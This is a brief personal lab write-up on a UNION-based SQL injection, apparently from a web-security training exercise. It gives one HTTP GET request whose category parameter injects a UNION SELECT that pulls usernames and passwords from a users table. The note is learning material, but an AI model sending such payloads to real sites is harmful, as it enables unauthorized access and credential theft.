# **UNION attack, retrieving data from other tables**

I believe we did this in a previous Lab, but basically union to print the user

```
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users+--+- HTTP/2
```
